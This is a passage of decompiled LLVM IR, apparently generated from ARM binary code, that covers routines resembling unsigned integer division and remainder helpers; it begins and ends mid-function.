  uselistorder i1 %v3_129e4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_129d4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 5, 7, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 12, 11, 13, 14 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12ad4, { 1, 0 }
  uselistorder label %dec_label_pc_12a78, { 1, 0 }
  uselistorder label %bb37, { 1, 0 }
  uselistorder label %dec_label_pc_129f8, { 2, 1, 0 }
}

define i32 @function_12ae8() local_unnamed_addr {
dec_label_pc_12ae8:
  %v0_12ae8 = load i32, i32* @r1, align 4
  %v1_12ae8 = add i32 %v0_12ae8, -1
  %v7_12ae8 = icmp eq i32 %v0_12ae8, 1
  br i1 %v7_12ae8, label %bb, label %bb82

bb:                                               ; preds = %dec_label_pc_12ae8
  %v2_12aec = load i32, i32* @r0, align 4
  ret i32 %v2_12aec

bb82:                                             ; preds = %dec_label_pc_12ae8
  %v2_12ae8 = icmp eq i32 %v0_12ae8, 0
  br i1 %v2_12ae8, label %dec_label_pc_12bd0, label %dec_label_pc_12af4

dec_label_pc_12af4:                               ; preds = %bb82
  %v0_12af4 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_12af4, %v0_12ae8
  br i1 %tmp, label %dec_label_pc_12afc, label %dec_label_pc_12b88

dec_label_pc_12afc:                               ; preds = %dec_label_pc_12af4
  %v2_12afc = and i32 %v1_12ae8, %v0_12ae8
  %v4_12afc = icmp eq i32 %v2_12afc, 0
  br i1 %v4_12afc, label %dec_label_pc_12b94, label %dec_label_pc_12b04

dec_label_pc_12b04:                               ; preds = %dec_label_pc_12afc
  %v3_12b04 = icmp ult i32 %v0_12ae8, 536870912
  br i1 %v3_12b04, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_12b04
  %v4_12b08 = mul i32 %v0_12ae8, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_12b04, %.thread
  %v0_12b28.pr36.ph = phi i32 [ %v4_12b08, %.thread ], [ %v0_12ae8, %dec_label_pc_12b04 ]
  %storemerge137 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_12b04 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb85
  %v0_12b28.pr36 = phi i32 [ %v4_12b1c, %bb85 ], [ %v0_12b28.pr36.ph, %.preheader.preheader ]
  %v1_12b20 = phi i32 [ %v4_12b20, %bb85 ], [ %storemerge137, %.preheader.preheader ]
  %v2_12b14 = icmp ugt i32 %v0_12b28.pr36, 268435455
  br i1 %v2_12b14, label %.thread2, label %bb83

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_12b28thread-pre-split.loopexit

bb83:                                             ; preds = %.preheader
  %v4_12b18 = icmp ult i32 %v0_12b28.pr36, %v0_12af4
  br i1 %v4_12b18, label %bb84, label %dec_label_pc_12b28thread-pre-split.loopexit.loopexit

bb84:                                             ; preds = %bb83
  %v2_12b1c = and i32 %v0_12b28.pr36, 268435456
  %v3_12b1c = icmp eq i32 %v2_12b1c, 0
  %v4_12b1c = mul i32 %v0_12b28.pr36, 16
  br i1 %v3_12b1c, label %bb85, label %dec_label_pc_12b28.loopexit

bb85:                                             ; preds = %bb84
  %v2_12b20 = and i32 %v1_12b20, 268435456
  %v3_12b20 = icmp eq i32 %v2_12b20, 0
  %v4_12b20 = mul i32 %v1_12b20, 16
  br i1 %v3_12b20, label %.preheader, label %dec_label_pc_12b28thread-pre-split.loopexit.loopexit

dec_label_pc_12b28thread-pre-split.loopexit.loopexit: ; preds = %bb85, %bb83
  %v1_12b3448.ph = phi i32 [ %v1_12b20, %bb83 ], [ %v4_12b20, %bb85 ]
  %v0_12b28.pr38.ph = phi i32 [ %v0_12b28.pr36, %bb83 ], [ %v4_12b1c, %bb85 ]
  br label %dec_label_pc_12b28thread-pre-split.loopexit

dec_label_pc_12b28thread-pre-split.loopexit:      ; preds = %dec_label_pc_12b28thread-pre-split.loopexit.loopexit, %.thread2
  %v1_12b3448 = phi i32 [ %v1_12b20, %.thread2 ], [ %v1_12b3448.ph, %dec_label_pc_12b28thread-pre-split.loopexit.loopexit ]
  %v0_12b28.pr38 = phi i32 [ %v0_12b28.pr36, %.thread2 ], [ %v0_12b28.pr38.ph, %dec_label_pc_12b28thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12b28thread-pre-split

dec_label_pc_12b28thread-pre-split:               ; preds = %dec_label_pc_12b28thread-pre-split.loopexit, %bb87
  %v1_12b3446 = phi i32 [ %v1_12b3448, %dec_label_pc_12b28thread-pre-split.loopexit ], [ %v3_12b34, %bb87 ]
  %v0_12b28.pr = phi i32 [ %v0_12b28.pr38, %dec_label_pc_12b28thread-pre-split.loopexit ], [ %v3_12b30, %bb87 ]
  br label %dec_label_pc_12b28

dec_label_pc_12b28.loopexit:                      ; preds = %bb84
  br label %dec_label_pc_12b28

dec_label_pc_12b28:                               ; preds = %dec_label_pc_12b28.loopexit, %dec_label_pc_12b28thread-pre-split
  %v1_12b34 = phi i32 [ %v1_12b3446, %dec_label_pc_12b28thread-pre-split ], [ %v1_12b20, %dec_label_pc_12b28.loopexit ]
  %v1_12b30 = phi i32 [ %v0_12b28.pr, %dec_label_pc_12b28thread-pre-split ], [ %v4_12b1c, %dec_label_pc_12b28.loopexit ]
  %v2_12b28 = icmp slt i32 %v1_12b30, 0
  br i1 %v2_12b28, label %dec_label_pc_12b3c, label %bb86

bb86:                                             ; preds = %dec_label_pc_12b28
  %v4_12b2c = icmp ult i32 %v1_12b30, %v0_12af4
  br i1 %v4_12b2c, label %bb87, label %dec_label_pc_12b3c

bb87:                                             ; preds = %bb86
  %v3_12b30 = mul i32 %v1_12b30, 2
  %v2_12b34 = icmp slt i32 %v1_12b34, 0
  %v3_12b34 = mul i32 %v1_12b34, 2
  br i1 %v2_12b34, label %dec_label_pc_12b3c, label %dec_label_pc_12b28thread-pre-split

dec_label_pc_12b3c:                               ; preds = %bb86, %dec_label_pc_12b28, %bb87
  %v2_12b4859 = phi i32 [ %v3_12b34, %bb87 ], [ %v1_12b34, %bb86 ], [ %v1_12b34, %dec_label_pc_12b28 ]
  %v1_12b4051 = phi i32 [ %v3_12b30, %bb87 ], [ %v1_12b30, %bb86 ], [ %v1_12b30, %dec_label_pc_12b28 ]
  br label %dec_label_pc_12b40

dec_label_pc_12b40:                               ; preds = %.thread11, %dec_label_pc_12b3c
  %v1_12b74 = phi i32 [ %v4_12b74, %.thread11 ], [ %v2_12b4859, %dec_label_pc_12b3c ]
  %v1_12b48 = phi i32 [ %v0_12b80, %.thread11 ], [ 0, %dec_label_pc_12b3c ]
  %v1_12b78 = phi i32 [ %v4_12b78, %.thread11 ], [ %v1_12b4051, %dec_label_pc_12b3c ]
  %v1_12b44 = phi i32 [ %v0_12b70, %.thread11 ], [ %v0_12af4, %dec_label_pc_12b3c ]
  %v3_12b40 = icmp ult i32 %v1_12b44, %v1_12b78
  br i1 %v3_12b40, label %.thread7, label %bb88

bb88:                                             ; preds = %dec_label_pc_12b40
  %v3_12b44 = sub i32 %v1_12b44, %v1_12b78
  %v3_12b48 = or i32 %v1_12b48, %v1_12b74
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_12b40, %bb88
  %v1_12b50 = phi i32 [ %v1_12b44, %dec_label_pc_12b40 ], [ %v3_12b44, %bb88 ]
  %v1_12b54 = phi i32 [ %v1_12b48, %dec_label_pc_12b40 ], [ %v3_12b48, %bb88 ]
  %v4_12b4c = udiv i32 %v1_12b78, 2
  %v6_12b4c = icmp ult i32 %v1_12b50, %v4_12b4c
  br i1 %v6_12b4c, label %.thread8, label %bb89

bb89:                                             ; preds = %.thread7
  %v3_12b50 = urem i32 %v1_12b78, 2
  %v4_12b50 = icmp eq i32 %v3_12b50, 0
  %v6_12b50 = sub i32 %v1_12b50, %v4_12b4c
  br i1 %v4_12b50, label %.thread8, label %bb90

bb90:                                             ; preds = %bb89
  %v5_12b54 = udiv i32 %v1_12b74, 2
  %v6_12b54 = or i32 %v1_12b54, %v5_12b54
  br label %.thread8

.thread8:                                         ; preds = %bb89, %.thread7, %bb90
  %v1_12b5c = phi i32 [ %v6_12b50, %bb89 ], [ %v1_12b50, %.thread7 ], [ %v6_12b50, %bb90 ]
  %v1_12b60 = phi i32 [ %v1_12b54, %bb89 ], [ %v1_12b54, %.thread7 ], [ %v6_12b54, %bb90 ]
  %v4_12b58 = udiv i32 %v1_12b78, 4
  %v6_12b58 = icmp ult i32 %v1_12b5c, %v4_12b58
  br i1 %v6_12b58, label %.thread9, label %bb91

bb91:                                             ; preds = %.thread8
  %v3_12b5c = and i32 %v1_12b78, 2
  %v4_12b5c = icmp eq i32 %v3_12b5c, 0
  %v6_12b5c = sub i32 %v1_12b5c, %v4_12b58
  br i1 %v4_12b5c, label %.thread9, label %bb92

bb92:                                             ; preds = %bb91
  %v5_12b60 = udiv i32 %v1_12b74, 4
  %v6_12b60 = or i32 %v1_12b60, %v5_12b60
  br label %.thread9

.thread9:                                         ; preds = %bb91, %.thread8, %bb92
  %v1_12b68 = phi i32 [ %v6_12b5c, %bb91 ], [ %v1_12b5c, %.thread8 ], [ %v6_12b5c, %bb92 ]
  %v1_12b6c = phi i32 [ %v1_12b60, %bb91 ], [ %v1_12b60, %.thread8 ], [ %v6_12b60, %bb92 ]
  %v4_12b64 = udiv i32 %v1_12b78, 8
  %v6_12b64 = icmp ult i32 %v1_12b68, %v4_12b64
  br i1 %v6_12b64, label %thread-pre-split, label %bb93

bb93:                                             ; preds = %.thread9
  %v3_12b68 = and i32 %v1_12b78, 4
  %v4_12b68 = icmp eq i32 %v3_12b68, 0
  %v6_12b68 = sub i32 %v1_12b68, %v4_12b64
  br i1 %v4_12b68, label %thread-pre-split, label %bb94

bb94:                                             ; preds = %bb93
  %v5_12b6c = udiv i32 %v1_12b74, 8
  %v6_12b6c = or i32 %v1_12b6c, %v5_12b6c
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb94, %.thread9, %bb93
  %v0_12b80 = phi i32 [ %v1_12b6c, %bb93 ], [ %v1_12b6c, %.thread9 ], [ %v6_12b6c, %bb94 ]
  %v0_12b70 = phi i32 [ %v6_12b68, %bb93 ], [ %v1_12b68, %.thread9 ], [ %v6_12b68, %bb94 ]
  %v2_12b70 = icmp eq i32 %v0_12b70, 0
  br i1 %v2_12b70, label %dec_label_pc_12b80, label %bb95

bb95:                                             ; preds = %thread-pre-split
  %tmp142 = icmp ult i32 %v1_12b74, 16
  br i1 %tmp142, label %dec_label_pc_12b80, label %.thread11

.thread11:                                        ; preds = %bb95
  %v4_12b74 = udiv i32 %v1_12b74, 16
  %v4_12b78 = udiv i32 %v1_12b78, 16
  br label %dec_label_pc_12b40

dec_label_pc_12b80:                               ; preds = %thread-pre-split, %bb95
  ret i32 %v0_12b80

dec_label_pc_12b88:                               ; preds = %dec_label_pc_12af4
  %v9_12af4 = icmp eq i32 %v0_12af4, %v0_12ae8
  %. = zext i1 %v9_12af4 to i32
  ret i32 %.

dec_label_pc_12b94:                               ; preds = %dec_label_pc_12afc
  %v2_12b94 = icmp ugt i32 %v0_12ae8, 65535
  br i1 %v2_12b94, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_12b94
  %v2_12b98 = and i32 %v0_12ae8, 32768
  %v3_12b98 = icmp eq i32 %v2_12b98, 0
  %v4_12b98 = udiv i32 %v0_12ae8, 65536
  br i1 %v3_12b98, label %.thread16, label %bb100

.thread16:                                        ; preds = %bb99, %dec_label_pc_12b94
  %v0_12ba465 = phi i32 [ %v0_12ae8, %dec_label_pc_12b94 ], [ %v4_12b98, %bb99 ]
  br label %bb100

bb100:                                            ; preds = %bb99, %.thread16
  %v1_12ba8 = phi i32 [ %v0_12ba465, %.thread16 ], [ %v4_12b98, %bb99 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb99 ]
  %v2_12ba4 = icmp ugt i32 %v1_12ba8, 255
  br i1 %v2_12ba4, label %bb101, label %.thread17

bb101:                                            ; preds = %bb100
  %v2_12ba8 = and i32 %v1_12ba8, 128
  %v3_12ba8 = icmp eq i32 %v2_12ba8, 0
  %v4_12ba8 = udiv i32 %v1_12ba8, 256
  br i1 %v3_12ba8, label %.thread17, label %bb102

bb102:                                            ; preds = %bb101
  %v2_12bac = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb101, %bb100, %bb102
  %v1_12bb8 = phi i32 [ %storemerge, %bb100 ], [ %storemerge, %bb101 ], [ %v2_12bac, %bb102 ]
  %v1_12bb4 = phi i32 [ %v1_12ba8, %bb100 ], [ %v4_12ba8, %bb101 ], [ %v4_12ba8, %bb102 ]
  %v2_12bb0 = icmp ugt i32 %v1_12bb4, 15
  br i1 %v2_12bb0, label %bb103, label %.thread18

bb103:                                            ; preds = %.thread17
  %v2_12bb4 = and i32 %v1_12bb4, 8
  %v3_12bb4 = icmp eq i32 %v2_12bb4, 0
  %v4_12bb4 = udiv i32 %v1_12bb4, 16
  br i1 %v3_12bb4, label %.thread18, label %bb104

bb104:                                            ; preds = %bb103
  %v2_12bb8 = add nsw i32 %v1_12bb8, 4
  br label %.thread18

.thread18:                                        ; preds = %bb103, %.thread17, %bb104
  %v4_12bc0 = phi i32 [ %v1_12bb8, %.thread17 ], [ %v1_12bb8, %bb103 ], [ %v2_12bb8, %bb104 ]
  %v5_12bc4 = phi i32 [ %v1_12bb4, %.thread17 ], [ %v4_12bb4, %bb103 ], [ %v4_12bb4, %bb104 ]
  %v2_12bbc = icmp ugt i32 %v5_12bc4, 3
  %v7_12bbc = icmp eq i32 %v5_12bc4, 4
  %v2_12bc0 = xor i1 %v7_12bbc, true
  %v3_12bc0 = and i1 %v2_12bbc, %v2_12bc0
  br i1 %v3_12bc0, label %bb105, label %bb106

bb105:                                            ; preds = %.thread18
  %v5_12bc0 = add nsw i32 %v4_12bc0, 3
  br label %bb106

bb106:                                            ; preds = %.thread18, %bb105
  %v4_12bc4 = phi i32 [ %v4_12bc0, %.thread18 ], [ %v5_12bc0, %bb105 ]
  %v2_12bc4 = xor i1 %v2_12bbc, true
  %v3_12bc4 = or i1 %v7_12bbc, %v2_12bc4
  br i1 %v3_12bc4, label %bb107, label %bb108

bb107:                                            ; preds = %bb106
  %v8_12bc4 = udiv i32 %v5_12bc4, 2
  %v9_12bc4 = add i32 %v4_12bc4, %v8_12bc4
  br label %bb108

bb108:                                            ; preds = %bb106, %bb107
  %v1_12bc8 = phi i32 [ %v4_12bc4, %bb106 ], [ %v9_12bc4, %bb107 ]
  %v6_12bc8 = lshr i32 %v0_12af4, %v1_12bc8
  ret i32 %v6_12bc8

dec_label_pc_12bd0:                               ; preds = %bb82
  %v0_12bd0 = load i32, i32* @lr, align 4
  %v0_12bd4 = call i32 @function_12da8()
  store i32 0, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_12bd0)
  %v9_12be0 = load i32, i32* @lr, align 4
  %v0_12be4 = call i32 @function_12ae8()
  store i32 %v9_12be0, i32* @lr, align 4
  ret i32 %v0_12be4

; uselistorder directives
  uselistorder i32 %v4_12bc4, { 1, 0 }
  uselistorder i1 %v7_12bbc, { 1, 0 }
  uselistorder i32 %v4_12bb4, { 1, 0 }
  uselistorder i32 %v1_12bb4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12ba8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_12ba8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12b98, { 1, 0 }
  uselistorder i32 %v0_12b70, { 1, 0 }
  uselistorder i32 %v4_12b64, { 1, 0 }
  uselistorder i32 %v1_12b6c, { 1, 2, 0 }
  uselistorder i32 %v4_12b58, { 1, 0 }
  uselistorder i32 %v1_12b60, { 1, 2, 0 }
  uselistorder i32 %v4_12b4c, { 1, 0 }
  uselistorder i32 %v1_12b54, { 1, 2, 0 }
  uselistorder i32 %v1_12b78, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_12b48, { 1, 0 }
  uselistorder i32 %v1_12b74, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_12b34, { 1, 0 }
  uselistorder i32 %v3_12b30, { 1, 0 }
  uselistorder i32 %v1_12b30, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_12b34, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12b20, { 1, 0 }
  uselistorder i32 %v4_12b1c, { 2, 1, 0 }
  uselistorder i32 %v1_12b20, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12b28.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_12af4, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_12ae8, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1, 10, 12, 11 }
  uselistorder i32 65535, { 4, 0, 1, 2, 3 }
  uselistorder label %bb108, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb100, { 1, 0 }
  uselistorder label %dec_label_pc_12b80, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_12b3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12b28thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_12bf8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12bf8:
  store i32 %arg1, i32* @r0, align 4
  %v1_12bf8 = add i32 %arg2, -1
  %v2_12bf8 = icmp eq i32 %arg2, 0
  br i1 %v2_12bf8, label %dec_label_pc_12cb4, label %dec_label_pc_12c00

dec_label_pc_12c00:                               ; preds = %dec_label_pc_12bf8
  %v7_12bf8 = icmp eq i32 %arg2, 1
  br i1 %v7_12bf8, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_12c00
  %v1_12c00 = load i32, i32* @r0, align 4
  %v10_12c00 = icmp eq i32 %v1_12c00, %arg2
  br i1 %v10_12c00, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_12c00, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_12c00 = icmp ult i32 %v1_12c00, %arg2
  br i1 %v4_12c00, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_12c08 = and i32 %v1_12bf8, %arg2
  %v8_12c08 = icmp eq i32 %v6_12c08, 0
  br i1 %v8_12c08, label %.thread67, label %dec_label_pc_12c18.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_12c0c = phi i32 [ %v1_12c00, %bb75 ], [ 0, %.thread65 ]
  %v3_12c0c = and i32 %v1_12c0c, %v1_12bf8
  br label %bb76

dec_label_pc_12c18.preheader:                     ; preds = %bb75
  %v2_12c1899 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_12c1899, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_12ca8, %bb74, %bb89, %bb84, %dec_label_pc_12c78, %.thread67
  %v5_12c10 = phi i32 [ %v1_12c00, %bb74 ], [ %v3_12c0c, %.thread67 ], [ %v1_12c54.v6_12c54.v6_12c5c.v6_12c64, %dec_label_pc_12c78 ], [ 0, %bb84 ], [ %v1_12cac, %dec_label_pc_12ca8 ], [ %v2_12ca8, %bb89 ]
  ret i32 %v5_12c10

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_12c18.preheader
  %v0_12c2c.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_12c18.preheader ], [ %v4_12c20, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_12c18.preheader ], [ %v2_12c2411, %.thread1.thread9 ]
  br label %dec_label_pc_12c2cthread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_12c18.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_12c2411, %.thread1.thread9 ], [ 0, %dec_label_pc_12c18.preheader ]
  %v0_12c2c.pr33100 = phi i32 [ %v4_12c20, %.thread1.thread9 ], [ %arg2, %dec_label_pc_12c18.preheader ]
  %v4_12c1c = icmp ult i32 %v0_12c2c.pr33100, %v1_12c00
  br i1 %v4_12c1c, label %bb78, label %dec_label_pc_12c2cthread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_12c20 = and i32 %v0_12c2c.pr33100, 268435456
  %v3_12c20 = icmp eq i32 %v2_12c20, 0
  %v4_12c20 = mul i32 %v0_12c2c.pr33100, 16
  br i1 %v3_12c20, label %.thread1.thread9, label %dec_label_pc_12c2c.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_12c2411 = add i32 %storemerge101, 4
  %v2_12c18 = icmp ugt i32 %v4_12c20, 268435455
  br i1 %v2_12c18, label %.thread, label %bb77

dec_label_pc_12c2cthread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_12c2cthread-pre-split.loopexit

dec_label_pc_12c2cthread-pre-split.loopexit:      ; preds = %dec_label_pc_12c2cthread-pre-split.loopexit.loopexit, %.thread
  %v0_12c2c.pr3398 = phi i32 [ %v0_12c2c.pr33.lcssa, %.thread ], [ %v0_12c2c.pr33100, %dec_label_pc_12c2cthread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_12c2cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12c2cthread-pre-split

dec_label_pc_12c2cthread-pre-split:               ; preds = %.thread4, %dec_label_pc_12c2cthread-pre-split.loopexit
  %v1_12c3839 = phi i32 [ %storemerge95, %dec_label_pc_12c2cthread-pre-split.loopexit ], [ %v2_12c38, %.thread4 ]
  %v0_12c2c.pr = phi i32 [ %v0_12c2c.pr3398, %dec_label_pc_12c2cthread-pre-split.loopexit ], [ %v3_12c34, %.thread4 ]
  br label %dec_label_pc_12c2c

dec_label_pc_12c2c.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_12c2c

dec_label_pc_12c2c:                               ; preds = %dec_label_pc_12c2c.loopexit, %dec_label_pc_12c2cthread-pre-split
  %v0_12c40.pr = phi i32 [ %v1_12c3839, %dec_label_pc_12c2cthread-pre-split ], [ %storemerge101, %dec_label_pc_12c2c.loopexit ]
  %v1_12c34 = phi i32 [ %v0_12c2c.pr, %dec_label_pc_12c2cthread-pre-split ], [ %v4_12c20, %dec_label_pc_12c2c.loopexit ]
  %v2_12c2c = icmp slt i32 %v1_12c34, 0
  br i1 %v2_12c2c, label %dec_label_pc_12c40, label %bb79

bb79:                                             ; preds = %dec_label_pc_12c2c
  %v4_12c30 = icmp ult i32 %v1_12c34, %v1_12c00
  br i1 %v4_12c30, label %.thread4, label %dec_label_pc_12c40

.thread4:                                         ; preds = %bb79
  %v3_12c34 = mul i32 %v1_12c34, 2
  %v2_12c38 = add i32 %v0_12c40.pr, 1
  br label %dec_label_pc_12c2cthread-pre-split

dec_label_pc_12c40:                               ; preds = %bb79, %dec_label_pc_12c2c
  %v2_12c40 = add i32 %v0_12c40.pr, -3
  %v5_12c44 = icmp slt i32 %v0_12c40.pr, 3
  br i1 %v5_12c44, label %dec_label_pc_12c84, label %dec_label_pc_12c48

dec_label_pc_12c48:                               ; preds = %dec_label_pc_12c40, %bb83
  %v6_12c70 = phi i32 [ %v0_12c78, %bb83 ], [ %v2_12c40, %dec_label_pc_12c40 ]
  %v1_12c4c = phi i32 [ %v1_12c54.v6_12c54.v6_12c5c.v6_12c64, %bb83 ], [ %v1_12c00, %dec_label_pc_12c40 ]
  %v3_12c6c12 = phi i32 [ %v3_12c6c, %bb83 ], [ %v1_12c34, %dec_label_pc_12c40 ]
  %v3_12c48 = icmp ult i32 %v1_12c4c, %v3_12c6c12
  %v3_12c4c = select i1 %v3_12c48, i32 0, i32 %v3_12c6c12
  %v1_12c54 = sub i32 %v1_12c4c, %v3_12c4c
  %v4_12c50 = udiv i32 %v3_12c6c12, 2
  %v6_12c50 = icmp ult i32 %v1_12c54, %v4_12c50
  %v6_12c54 = select i1 %v6_12c50, i32 0, i32 %v4_12c50
  %v1_12c54.v6_12c54 = sub i32 %v1_12c54, %v6_12c54
  %.demorgan = and i1 %v3_12c48, %v6_12c50
  %v4_12c58 = udiv i32 %v3_12c6c12, 4
  %v6_12c58 = icmp ult i32 %v1_12c54.v6_12c54, %v4_12c58
  %v6_12c5c = select i1 %v6_12c58, i32 0, i32 %v4_12c58
  %v1_12c54.v6_12c54.v6_12c5c = sub i32 %v1_12c54.v6_12c54, %v6_12c5c
  %.demorgan71 = and i1 %.demorgan, %v6_12c58
  %v4_12c60 = udiv i32 %v3_12c6c12, 8
  %v6_12c60 = icmp ult i32 %v1_12c54.v6_12c54.v6_12c5c, %v4_12c60
  %v6_12c64 = select i1 %v6_12c60, i32 0, i32 %v4_12c60
  %v1_12c54.v6_12c54.v6_12c5c.v6_12c64 = sub i32 %v1_12c54.v6_12c54.v6_12c5c, %v6_12c64
  %.demorgan72 = and i1 %.demorgan71, %v6_12c60
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_12c48
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_12c48, %bb80
  %v2_12c68 = add i32 %v1_12c54.v6_12c54.v6_12c5c.v6_12c64, -1
  %v4_12c68 = sub i32 0, %v1_12c54.v6_12c54.v6_12c5c.v6_12c64
  %v5_12c68 = and i32 %v1_12c54.v6_12c54.v6_12c5c.v6_12c64, %v4_12c68
  %v3_12c6c = udiv i32 %v3_12c6c12, 16
  %v5_12c70 = icmp slt i32 %v1_12c54.v6_12c54.v6_12c5c.v6_12c64, 1
  br i1 %v5_12c70, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_12c70 = add i32 %v6_12c70, -4
  %v9_12c70 = sub i32 3, %v6_12c70
  %v10_12c70 = and i32 %v9_12c70, %v6_12c70
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_12c78 = phi i32 [ %v6_12c70, %bb81 ], [ %v7_12c70, %bb82 ]
  %v0_12c7415.in = phi i32 [ %v2_12c68, %bb81 ], [ %v7_12c70, %bb82 ]
  %v1_12c7414.in = phi i32 [ %v5_12c68, %bb81 ], [ %v10_12c70, %bb82 ]
  %v1_12c7414 = icmp slt i32 %v1_12c7414.in, 0
  %v0_12c7415 = icmp slt i32 %v0_12c7415.in, 0
  %v2_12c74 = xor i1 %v0_12c7415, %v1_12c7414
  br i1 %v2_12c74, label %dec_label_pc_12c78, label %dec_label_pc_12c48

dec_label_pc_12c78:                               ; preds = %bb83
  %v1_12c78 = urem i32 %v0_12c78, 4
  %v2_12c78 = icmp eq i32 %v1_12c78, 0
  br i1 %v2_12c78, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_12c78
  %v3_12c7c = icmp eq i32 %v1_12c54.v6_12c54.v6_12c5c.v6_12c64, 0
  br i1 %v3_12c7c, label %bb76, label %dec_label_pc_12c84

dec_label_pc_12c84:                               ; preds = %bb84, %dec_label_pc_12c40
  %v0_12c98 = phi i32 [ %v3_12c6c, %bb84 ], [ %v1_12c34, %dec_label_pc_12c40 ]
  %v1_12c94 = phi i32 [ %v1_12c54.v6_12c54.v6_12c5c.v6_12c64, %bb84 ], [ %v1_12c00, %dec_label_pc_12c40 ]
  %v0_12c84 = phi i32 [ %v0_12c78, %bb84 ], [ %v2_12c40, %dec_label_pc_12c40 ]
  %v5_12c88 = icmp slt i32 %v0_12c84, -2
  br i1 %v5_12c88, label %dec_label_pc_12ca8, label %dec_label_pc_12c8c

dec_label_pc_12c8c:                               ; preds = %dec_label_pc_12c84
  %v8_12c84 = icmp eq i32 %v0_12c84, -2
  br i1 %v8_12c84, label %dec_label_pc_12c9c, label %dec_label_pc_12c90

dec_label_pc_12c90:                               ; preds = %dec_label_pc_12c8c
  %v3_12c90 = icmp ult i32 %v1_12c94, %v0_12c98
  br i1 %v3_12c90, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_12c90
  %v2_12c90 = sub i32 %v1_12c94, %v0_12c98
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_12c90, %bb85
  %v0_12c9c52 = phi i32 [ %v1_12c94, %dec_label_pc_12c90 ], [ %v2_12c90, %bb85 ]
  %v3_12c98 = udiv i32 %v0_12c98, 2
  br label %dec_label_pc_12c9c

dec_label_pc_12c9c:                               ; preds = %dec_label_pc_12c8c, %bb86
  %v0_12ca4 = phi i32 [ %v0_12c98, %dec_label_pc_12c8c ], [ %v3_12c98, %bb86 ]
  %v1_12ca0 = phi i32 [ %v1_12c94, %dec_label_pc_12c8c ], [ %v0_12c9c52, %bb86 ]
  %v3_12c9c = icmp ult i32 %v1_12ca0, %v0_12ca4
  br i1 %v3_12c9c, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_12c9c
  %v2_12c9c = sub i32 %v1_12ca0, %v0_12ca4
  br label %bb88

